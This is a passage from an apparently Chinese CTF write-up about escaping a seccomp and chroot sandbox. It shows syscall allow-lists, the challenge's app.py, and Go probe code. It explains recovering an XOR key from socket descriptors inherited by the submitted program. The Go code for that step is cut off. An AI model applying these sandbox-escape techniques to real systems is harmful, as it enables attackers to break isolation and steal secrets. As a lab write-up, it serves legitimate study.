punctuation">,</span> <span class="token string">'setregid'</span><span class="token punctuation">,</span> <span class="token string">'getpid'</span><span class="token punctuation">,</span> <span class="token string">'getppid'</span><span class="token punctuation">,</span> <span class="token string">'fork'</span><span class="token punctuation">,</span> <span class="token string">'chdir'</span><span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">,</span> <span class="token string">'creat'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>看看还有什么没挂掉：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">,</span> <span class="token string">'write'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'close'</span><span class="token punctuation">,</span> <span class="token string">'stat'</span><span class="token punctuation">,</span> <span class="token string">'fstat'</span><span class="token punctuation">,</span> <span class="token string">'lstat'</span><span class="token punctuation">,</span> <span class="token string">'poll'</span><span class="token punctuation">,</span> <span class="token string">'lseek'</span><span class="token punctuation">,</span> <span class="token string">'mmap'</span><span class="token punctuation">,</span> <span class="token string">'mprotect'</span><span class="token punctuation">,</span> <span class="token string">'munmap'</span><span class="token punctuation">,</span> <span class="token string">'brk'</span><span class="token punctuation">,</span> <span class="token string">'rt_sigaction'</span><span class="token punctuation">,</span> <span class="token string">'rt_sigprocmask'</span><span class="token punctuation">,</span> <span class="token string">'rt_sigreturn'</span><span class="token punctuation">,</span> <span class="token string">'pread64'</span><span class="token punctuation">,</span> <span class="token string">'pwrite64'</span><span class="token punctuation">,</span> <span class="token string">'readv'</span><span class="token punctuation">,</span> <span class="token string">'writev'</span><span class="token punctuation">,</span> <span class="token string">'access'</span><span class="token punctuation">,</span> <span class="token string">'pipe'</span><span class="token punctuation">,</span> <span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'sched_yield'</span><span class="token punctuation">,</span> <span class="token string">'mremap'</span><span class="token punctuation">,</span> <span class="token string">'msync'</span><span class="token punctuation">,</span> <span class="token string">'mincore'</span><span class="token punctuation">,</span> <span class="token string">'madvise'</span><span class="token punctuation">,</span> <span class="token string">'shmget'</span><span class="token punctuation">,</span> <span class="token string">'shmat'</span><span class="token punctuation">,</span> <span class="token string">'shmctl'</span><span class="token punctuation">,</span> <span class="token string">'dup'</span><span class="token punctuation">,</span> <span class="token string">'dup2'</span><span class="token punctuation">,</span> <span class="token string">'pause'</span><span class="token punctuation">,</span> <span class="token string">'nanosleep'</span><span class="token punctuation">,</span> <span class="token string">'getitimer'</span><span class="token punctuation">,</span> <span class="token string">'alarm'</span><span class="token punctuation">,</span> <span class="token string">'setitimer'</span><span class="token punctuation">,</span> <span class="token string">'sendfile'</span><span class="token punctuation">,</span> <span class="token string">'socket'</span><span class="token punctuation">,</span> <span class="token string">'connect'</span><span class="token punctuation">,</span> <span class="token string">'accept'</span><span class="token punctuation">,</span> <span class="token string">'sendto'</span><span class="token punctuation">,</span> <span class="token string">'recvfrom'</span><span class="token punctuation">,</span> <span class="token string">'sendmsg'</span><span class="token punctuation">,</span> <span class="token string">'recvmsg'</span><span class="token punctuation">,</span> <span class="token string">'shutdown'</span><span class="token punctuation">,</span> <span class="token string">'bind'</span><span class="token punctuation">,</span> <span class="token string">'listen'</span><span class="token punctuation">,</span> <span class="token string">'getsockname'</span><span class="token punctuation">,</span> <span class="token string">'getpeername'</span><span class="token punctuation">,</span> <span class="token string">'socketpair'</span><span class="token punctuation">,</span> <span class="token string">'setsockopt'</span><span class="token punctuation">,</span> <span class="token string">'getsockopt'</span><span class="token punctuation">,</span> <span class="token string">'clone'</span><span class="token punctuation">,</span> <span class="token string">'vfork'</span><span class="token punctuation">,</span> <span class="token string">'execve'</span><span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">,</span> <span class="token string">'wait4'</span><span class="token punctuation">,</span> <span class="token string">'kill'</span><span class="token punctuation">,</span> <span class="token string">'uname'</span><span class="token punctuation">,</span> <span class="token string">'semget'</span><span class="token punctuation">,</span> <span class="token string">'semop'</span><span class="token punctuation">,</span> <span class="token string">'semctl'</span><span class="token punctuation">,</span> <span class="token string">'shmdt'</span><span class="token punctuation">,</span> <span class="token string">'msgget'</span><span class="token punctuation">,</span> <span class="token string">'msgsnd'</span><span class="token punctuation">,</span> <span class="token string">'msgrcv'</span><span class="token punctuation">,</span> <span class="token string">'msgctl'</span><span class="token punctuation">,</span> <span class="token string">'fcntl'</span><span class="token punctuation">,</span> <span class="token string">'flock'</span><span class="token punctuation">,</span> <span class="token string">'fsync'</span><span class="token punctuation">,</span> <span class="token string">'fdatasync'</span><span class="token punctuation">,</span> <span class="token string">'truncate'</span><span class="token punctuation">,</span> <span class="token string">'ftruncate'</span><span class="token punctuation">,</span> <span class="token string">'getdents'</span><span class="token punctuation">,</span> <span class="token string">'getcwd'</span><span class="token punctuation">,</span> <span class="token string">'fchdir'</span><span class="token punctuation">,</span> <span class="token string">'rename'</span><span class="token punctuation">,</span> <span class="token string">'mkdir'</span><span class="token punctuation">,</span> <span class="token string">'rmdir'</span><span class="token punctuation">,</span> <span class="token string">'unlink'</span><span class="token punctuation">,</span> <span class="token string">'readlink'</span><span class="token punctuation">,</span> <span class="token string">'umask'</span><span class="token punctuation">,</span> <span class="token string">'gettimeofday'</span><span class="token punctuation">,</span> <span class="token string">'getrlimit'</span><span class="token punctuation">,</span> <span class="token string">'getrusage'</span><span class="token punctuation">,</span> <span class="token string">'sysinfo'</span><span class="token punctuation">,</span> <span class="token string">'times'</span><span class="token punctuation">,</span> <span class="token string">'getuid'</span><span class="token punctuation">,</span> <span class="token string">'syslog'</span><span class="token punctuation">,</span> <span class="token string">'getgid'</span><span class="token punctuation">,</span> <span class="token string">'geteuid'</span><span class="token punctuation">,</span> <span class="token string">'getegid'</span><span class="token punctuation">,</span> <span class="token string">'getpgrp'</span><span class="token punctuation">,</span> <span class="token string">'getgroups'</span><span class="token punctuation">,</span> <span class="token string">'setgroups'</span><span class="token punctuation">,</span> <span class="token string">'getresuid'</span><span class="token punctuation">,</span> <span class="token string">'getresgid'</span><span class="token punctuation">,</span> <span class="token string">'getpgid'</span><span class="token punctuation">,</span> <span class="token string">'getsid'</span><span class="token punctuation">,</span> <span class="token string">'capget'</span><span class="token punctuation">,</span> <span class="token string">'capset'</span><span class="token punctuation">,</span> <span class="token string">'rt_sigpending'</span><span class="token punctuation">,</span> <span class="token string">'rt_sigtimedwait'</span><span class="token punctuation">,</span> <span class="token string">'rt_sigqueueinfo'</span><span class="token punctuation">,</span> <span class="token string">'rt_sigsuspend'</span><span class="token punctuation">,</span> <span class="token string">'sigaltstack'</span><span class="token punctuation">,</span> <span class="token string">'utime'</span><span class="token punctuation">,</span> <span class="token string">'mknod'</span><span class="token punctuation">,</span> <span class="token string">'uselib'</span><span class="token punctuation">,</span> <span class="token string">'personality'</span><span class="token punctuation">,</span> <span class="token string">'ustat'</span><span class="token punctuation">,</span> <span class="token string">'statfs'</span><span class="token punctuation">,</span> <span class="token string">'fstatfs'</span><span class="token punctuation">,</span> <span class="token string">'sysfs'</span><span class="token punctuation">,</span> <span class="token string">'getpriority'</span><span class="token punctuation">,</span> <span class="token string">'setpriority'</span><span class="token punctuation">,</span> <span class="token string">'sched_setparam'</span><span class="token punctuation">,</span> <span class="token string">'sched_getparam'</span><span class="token punctuation">,</span> <span class="token string">'sched_setscheduler'</span><span class="token punctuation">,</span> <span class="token string">'sched_getscheduler'</span><span class="token punctuation">,</span> <span class="token string">'sched_get_priority_max'</span><span class="token punctuation">,</span> <span class="token string">'sched_get_priority_min'</span><span class="token punctuation">,</span> <span class="token string">'sched_rr_get_interval'</span><span class="token punctuation">,</span> <span class="token string">'mlock'</span><span class="token punctuation">,</span> <span class="token string">'munlock'</span><span class="token punctuation">,</span> <span class="token string">'mlockall'</span><span class="token punctuation">,</span> <span class="token string">'munlockall'</span><span class="token punctuation">,</span> <span class="token string">'vhangup'</span><span class="token punctuation">,</span> <span class="token string">'modify_ldt'</span><span class="token punctuation">,</span> <span class="token string">'pivot_root'</span><span class="token punctuation">,</span> <span class="token string">'_sysctl'</span><span class="token punctuation">,</span> <span class="token string">'prctl'</span><span class="token punctuation">,</span> <span class="token string">'arch_prctl'</span><span class="token punctuation">,</span> <span class="token string">'adjtimex'</span><span class="token punctuation">,</span> <span class="token string">'setrlimit'</span><span class="token punctuation">,</span> <span class="token string">'sync'</span><span class="token punctuation">,</span> <span class="token string">'acct'</span><span class="token punctuation">,</span> <span class="token string">'settimeofday'</span><span class="token punctuation">,</span> <span class="token string">'umount2'</span><span class="token punctuation">,</span> <span class="token string">'swapon'</span><span class="token punctuation">,</span> <span class="token string">'swapoff'</span><span class="token punctuation">,</span> <span class="token string">'reboot'</span><span class="token punctuation">,</span> <span class="token string">'sethostname'</span><span class="token punctuation">,</span> <span class="token string">'setdomainname'</span><span class="token punctuation">,</span> <span class="token string">'iopl'</span><span class="token punctuation">,</span> <span class="token string">'ioperm'</span><span class="token punctuation">,</span> <span class="token string">'create_module'</span><span class="token punctuation">,</span> <span class="token string">'init_module'</span><span class="token punctuation">,</span> <span class="token string">'delete_module'</span><span class="token punctuation">,</span> <span class="token string">'get_kernel_syms'</span><span class="token punctuation">,</span> <span class="token string">'query_module'</span><span class="token punctuation">,</span> <span class="token string">'quotactl'</span><span class="token punctuation">,</span> <span class="token string">'nfsservctl'</span><span class="token punctuation">,</span> <span class="token string">'getpmsg'</span><span class="token punctuation">,</span> <span class="token string">'putpmsg'</span><span class="token punctuation">,</span> <span class="token string">'afs_syscall'</span><span class="token punctuation">,</span> <span class="token string">'tuxcall'</span><span class="token punctuation">,</span> <span class="token string">'security'</span><span class="token punctuation">,</span> <span class="token string">'gettid'</span><span class="token punctuation">,</span> <span class="token string">'readahead'</span><span class="token punctuation">,</span> <span class="token string">'setxattr'</span><span class="token punctuation">,</span> <span class="token string">'lsetxattr'</span><span class="token punctuation">,</span> <span class="token string">'fsetxattr'</span><span class="token punctuation">,</span> <span class="token string">'getxattr'</span><span class="token punctuation">,</span> <span class="token string">'lgetxattr'</span><span class="token punctuation">,</span> <span class="token string">'fgetxattr'</span><span class="token punctuation">,</span> <span class="token string">'listxattr'</span><span class="token punctuation">,</span> <span class="token string">'llistxattr'</span><span class="token punctuation">,</span> <span class="token string">'flistxattr'</span><span class="token punctuation">,</span> <span class="token string">'removexattr'</span><span class="token punctuation">,</span> <span class="token string">'lremovexattr'</span><span class="token punctuation">,</span> <span class="token string">'fremovexattr'</span><span class="token punctuation">,</span> <span class="token string">'tkill'</span><span class="token punctuation">,</span> <span class="token string">'time'</span><span class="token punctuation">,</span> <span class="token string">'futex'</span><span class="token punctuation">,</span> <span class="token string">'sched_setaffinity'</span><span class="token punctuation">,</span> <span class="token string">'sched_getaffinity'</span><span class="token punctuation">,</span> <span class="token string">'set_thread_area'</span><span class="token punctuation">,</span> <span class="token string">'io_setup'</span><span class="token punctuation">,</span> <span class="token string">'io_destroy'</span><span class="token punctuation">,</span> <span class="token string">'io_getevents'</span><span class="token punctuation">,</span> <span class="token string">'io_submit'</span><span class="token punctuation">,</span> <span class="token string">'io_cancel'</span><span class="token punctuation">,</span> <span class="token string">'get_thread_area'</span><span class="token punctuation">,</span> <span class="token string">'lookup_dcookie'</span><span class="token punctuation">,</span> <span class="token string">'epoll_create'</span><span class="token punctuation">,</span> <span class="token string">'epoll_ctl_old'</span><span class="token punctuation">,</span> <span class="token string">'epoll_wait_old'</span><span class="token punctuation">,</span> <span class="token string">'remap_file_pages'</span><span class="token punctuation">,</span> <span class="token string">'getdents64'</span><span class="token punctuation">,</span> <span class="token string">'set_tid_address'</span><span class="token punctuation">,</span> <span class="token string">'restart_syscall'</span><span class="token punctuation">,</span> <span class="token string">'semtimedop'</span><span class="token punctuation">,</span> <span class="token string">'fadvise64'</span><span class="token punctuation">,</span> <span class="token string">'timer_create'</span><span class="token punctuation">,</span> <span class="token string">'timer_settime'</span><span class="token punctuation">,</span> <span class="token string">'timer_gettime'</span><span class="token punctuation">,</span> <span class="token string">'timer_getoverrun'</span><span class="token punctuation">,</span> <span class="token string">'timer_delete'</span><span class="token punctuation">,</span> <span class="token string">'clock_settime'</span><span class="token punctuation">,</span> <span class="token string">'clock_gettime'</span><span class="token punctuation">,</span> <span class="token string">'clock_getres'</span><span class="token punctuation">,</span> <span class="token string">'clock_nanosleep'</span><span class="token punctuation">,</span> <span class="token string">'exit_group'</span><span class="token punctuation">,</span> <span class="token string">'epoll_wait'</span><span class="token punctuation">,</span> <span class="token string">'epoll_ctl'</span><span class="token punctuation">,</span> <span class="token string">'tgkill'</span><span class="token punctuation">,</span> <span class="token string">'utimes'</span><span class="token punctuation">,</span> <span class="token string">'vserver'</span><span class="token punctuation">,</span> <span class="token string">'mbind'</span><span class="token punctuation">,</span> <span class="token string">'set_mempolicy'</span><span class="token punctuation">,</span> <span class="token string">'get_mempolicy'</span><span class="token punctuation">,</span> <span class="token string">'mq_open'</span><span class="token punctuation">,</span> <span class="token string">'mq_unlink'</span><span class="token punctuation">,</span> <span class="token string">'mq_timedsend'</span><span class="token punctuation">,</span> <span class="token string">'mq_timedreceive'</span><span class="token punctuation">,</span> <span class="token string">'mq_notify'</span><span class="token punctuation">,</span> <span class="token string">'mq_getsetattr'</span><span class="token punctuation">,</span> <span class="token string">'kexec_load'</span><span class="token punctuation">,</span> <span class="token string">'waitid'</span><span class="token punctuation">,</span> <span class="token string">'add_key'</span><span class="token punctuation">,</span> <span class="token string">'request_key'</span><span class="token punctuation">,</span> <span class="token string">'keyctl'</span><span class="token punctuation">,</span> <span class="token string">'ioprio_set'</span><span class="token punctuation">,</span> <span class="token string">'ioprio_get'</span><span class="token punctuation">,</span> <span class="token string">'inotify_init'</span><span class="token punctuation">,</span> <span class="token string">'inotify_add_watch'</span><span class="token punctuation">,</span> <span class="token string">'inotify_rm_watch'</span><span class="token punctuation">,</span> <span class="token string">'migrate_pages'</span><span class="token punctuation">,</span> <span class="token string">'openat'</span><span class="token punctuation">,</span> <span class="token string">'mkdirat'</span><span class="token punctuation">,</span> <span class="token string">'mknodat'</span><span class="token punctuation">,</span> <span class="token string">'fchownat'</span><span class="token punctuation">,</span> <span class="token string">'futimesat'</span><span class="token punctuation">,</span> <span class="token string">'newfstatat'</span><span class="token punctuation">,</span> <span class="token string">'unlinkat'</span><span class="token punctuation">,</span> <span class="token string">'renameat'</span><span class="token punctuation">,</span> <span class="token string">'linkat'</span><span class="token punctuation">,</span> <span class="token string">'symlinkat'</span><span class="token punctuation">,</span> <span class="token string">'readlinkat'</span><span class="token punctuation">,</span> <span class="token string">'fchmodat'</span><span class="token punctuation">,</span> <span class="token string">'faccessat'</span><span class="token punctuation">,</span> <span class="token string">'pselect6'</span><span class="token punctuation">,</span> <span class="token string">'ppoll'</span><span class="token punctuation">,</span> <span class="token string">'unshare'</span><span class="token punctuation">,</span> <span class="token string">'set_robust_list'</span><span class="token punctuation">,</span> <span class="token string">'get_robust_list'</span><span class="token punctuation">,</span> <span class="token string">'splice'</span><span class="token punctuation">,</span> <span class="token string">'tee'</span><span class="token punctuation">,</span> <span class="token string">'sync_file_range'</span><span class="token punctuation">,</span> <span class="token string">'vmsplice'</span><span class="token punctuation">,</span> <span class="token string">'move_pages'</span><span class="token punctuation">,</span> <span class="token string">'utimensat'</span><span class="token punctuation">,</span> <span class="token string">'epoll_pwait'</span><span class="token punctuation">,</span> <span class="token string">'signalfd'</span><span class="token punctuation">,</span> <span class="token string">'timerfd_create'</span><span class="token punctuation">,</span> <span class="token string">'eventfd'</span><span class="token punctuation">,</span> <span class="token string">'fallocate'</span><span class="token punctuation">,</span> <span class="token string">'timerfd_settime'</span><span class="token punctuation">,</span> <span class="token string">'timerfd_gettime'</span><span class="token punctuation">,</span> <span class="token string">'accept4'</span><span class="token punctuation">,</span> <span class="token string">'signalfd4'</span><span class="token punctuation">,</span> <span class="token string">'eventfd2'</span><span class="token punctuation">,</span> <span class="token string">'epoll_create1'</span><span class="token punctuation">,</span> <span class="token string">'dup3'</span><span class="token punctuation">,</span> <span class="token string">'pipe2'</span><span class="token punctuation">,</span> <span class="token string">'inotify_init1'</span><span class="token punctuation">,</span> <span class="token string">'preadv'</span><span class="token punctuation">,</span> <span class="token string">'pwritev'</span><span class="token punctuation">,</span> <span class="token string">'rt_tgsigqueueinfo'</span><span class="token punctuation">,</span> <span class="token string">'perf_event_open'</span><span class="token punctuation">,</span> <span class="token string">'recvmmsg'</span><span class="token punctuation">,</span> <span class="token string">'fanotify_init'</span><span class="token punctuation">,</span> <span class="token string">'fanotify_mark'</span><span class="token punctuation">,</span> <span class="token string">'prlimit64'</span><span class="token punctuation">,</span> <span class="token string">'name_to_handle_at'</span><span class="token punctuation">,</span> <span class="token string">'open_by_handle_at'</span><span class="token punctuation">,</span> <span class="token string">'clock_adjtime'</span><span class="token punctuation">,</span> <span class="token string">'syncfs'</span><span class="token punctuation">,</span> <span class="token string">'sendmmsg'</span><span class="token punctuation">,</span> <span class="token string">'setns'</span><span class="token punctuation">,</span> <span class="token string">'getcpu'</span><span class="token punctuation">,</span> <span class="token string">'process_vm_readv'</span><span class="token punctuation">,</span> <span class="token string">'process_vm_writev'</span><span class="token punctuation">,</span> <span class="token string">'kcmp'</span><span class="token punctuation">,</span> <span class="token string">'finit_module'</span><span class="token punctuation">,</span> <span class="token string">'sched_setattr'</span><span class="token punctuation">,</span> <span class="token string">'sched_getattr'</span><span class="token punctuation">,</span> <span class="token string">'renameat2'</span><span class="token punctuation">,</span> <span class="token string">'seccomp'</span><span class="token punctuation">,</span> <span class="token string">'getrandom'</span><span class="token punctuation">,</span> <span class="token string">'memfd_create'</span><span class="token punctuation">,</span> <span class="token string">'kexec_file_load'</span><span class="token punctuation">,</span> <span class="token string">'bpf'</span><span class="token punctuation">,</span> <span class="token string">'execveat'</span><span class="token punctuation">,</span> <span class="token string">'userfaultfd'</span><span class="token punctuation">,</span> <span class="token string">'membarrier'</span><span class="token punctuation">,</span> <span class="token string">'mlock2'</span><span class="token punctuation">,</span> <span class="token string">'copy_file_range'</span><span class="token punctuation">,</span> <span class="token string">'preadv2'</span><span class="token punctuation">,</span> <span class="token string">'pwritev2'</span><span class="token punctuation">,</span> <span class="token string">'pkey_mprotect'</span><span class="token punctuation">,</span> <span class="token string">'pkey_alloc'</span><span class="token punctuation">,</span> <span class="token string">'pkey_free'</span><span class="token punctuation">,</span> <span class="token string">'statx'</span><span class="token punctuation">,</span> <span class="token string">'io_pgetevents'</span><span class="token punctuation">,</span> <span class="token string">'rseq'</span><span class="token punctuation">,</span> <span class="token string">'pidfd_send_signal'</span><span class="token punctuation">,</span> <span class="token string">'io_uring_setup'</span><span class="token punctuation">,</span> <span class="token string">'io_uring_enter'</span><span class="token punctuation">,</span> <span class="token string">'io_uring_register'</span><span class="token punctuation">,</span> <span class="token string">'open_tree'</span><span class="token punctuation">,</span> <span class="token string">'move_mount'</span><span class="token punctuation">,</span> <span class="token string">'fsopen'</span><span class="token punctuation">,</span> <span class="token string">'fsconfig'</span><span class="token punctuation">,</span> <span class="token string">'fsmount'</span><span class="token punctuation">,</span> <span class="token string">'fspick'</span><span class="token punctuation">,</span> <span class="token string">'pidfd_open'</span><span class="token punctuation">,</span> <span class="token string">'clone3'</span><span class="token punctuation">,</span> <span class="token string">'close_range'</span><span class="token punctuation">,</span> <span class="token string">'pidfd_getfd'</span><span class="token punctuation">,</span> <span class="token string">'faccessat2'</span><span class="token punctuation">,</span> <span class="token string">'process_madvise'</span><span class="token punctuation">,</span> <span class="token string">'epoll_pwait2'</span><span class="token punctuation">,</span> <span class="token string">'mount_setattr'</span><span class="token punctuation">,</span> <span class="token string">'landlock_create_ruleset'</span><span class="token punctuation">,</span> <span class="token string">'landlock_add_rule'</span><span class="token punctuation">,</span> <span class="token string">'landlock_restrict_self'</span><span class="token punctuation">,</span> <span class="token string">'memfd_secret'</span><span class="token punctuation">,</span> <span class="token string">'process_mrelease'</span><span class="token punctuation">,</span> <span class="token string">'futex_waitv'</span><span class="token punctuation">,</span> <span class="token string">'set_mempolicy_home_node'</span><span class="token punctuation">,</span> <span class="token string">'cachestat'</span><span class="token punctuation">,</span> <span class="token string">'fchmodat2'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>能读能写，测试发现目录没有写权限，毕竟根目录被 chroot 改了也没办法</p>
<p>前面我们读到 chroot 目录下留了个 prog 文件，尝试用系统调用读取</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"os"</span>
	<span class="token string">"syscall"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">// 打开一个文件</span>
	file<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"/prog"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error opening file:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">defer</span> file<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	<span class="token comment">// 读取文件内容</span>
	buffer <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span>
	n<span class="token punctuation">,</span> err <span class="token operator">:=</span> syscall<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error reading file:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	<span class="token comment">// 输出读取的内容</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Read %d bytes: %s\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> buffer<span class="token punctuation">[</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>返回 malformed URI sequence，其实是返回了一个很大的结果导致截断，可以抓包看看</p>
<p>结合题目的app.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">run_in_sandbox</span><span class="token punctuation">(</span>prog<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">2077</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    chall <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>chall<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
       chall<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span>
    
    prog <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>prog<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>prog<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        prog<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span>

    options <span class="token operator">=</span> <span class="token number">52</span>
    pkt <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    pkt<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;II'</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>prog<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>chall<span class="token punctuation">)</span><span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">)</span>
    pkt<span class="token punctuation">.</span>write<span class="token punctuation">(</span>chall<span class="token punctuation">)</span>
    pkt<span class="token punctuation">.</span>write<span class="token punctuation">(</span>prog<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pkt<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    output <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            output<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>

    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> output<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以知道这个 prog 就是我们传入的代码，app.py 会发送数据包到 2077 端口上，即这里的 sandbox</p>
<p>而 app.py 发送的 prog 数据都是 XOR 过 key 的，我们首先需要想办法获取 &#x2F;sandbox&#x2F;sandbox.key</p>
<p>因为这里建立了一个 connection ，在系统调用中没被 close，那么这个 <code>connection</code> 会一路继承到我们要执行的 <code>/prog</code>，并且如果还有其它有效的 <code>connection</code>的话，也会一起继承下去。什么意思呢，就是发送的数据包内容会存在于 prog 中，这个数据包的内容可能存在上一次数据包被截断的部分</p>
<p>prog 的数据已知，所以截获到加密后的数据可以还原 key，先写个 go 程序，把全部 fd 都 recv 一遍</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
<span class="token keyword">import</span> <span class="token punctuation">(</span>
  <span class="token string">"fmt"</span>
  <span class="token string">"os"</span>
  <span class="token string">"os/signal"</span>
  <span class="token string">"syscall"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  sigc <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> os<span class="token punctuation">.</span>Signal<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
  signal<span class="token punctuation">.</span><span class="token function">Notify</span><span class="token punctuation">(</span>sigc<span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>SIGALRM<span class="token punctuation">)</span>
  <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token boolean">_</span> <span class="token operator">=</span> <span class="token operator">&lt;-</span>sigc<span class="token punctuation">;</span> os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
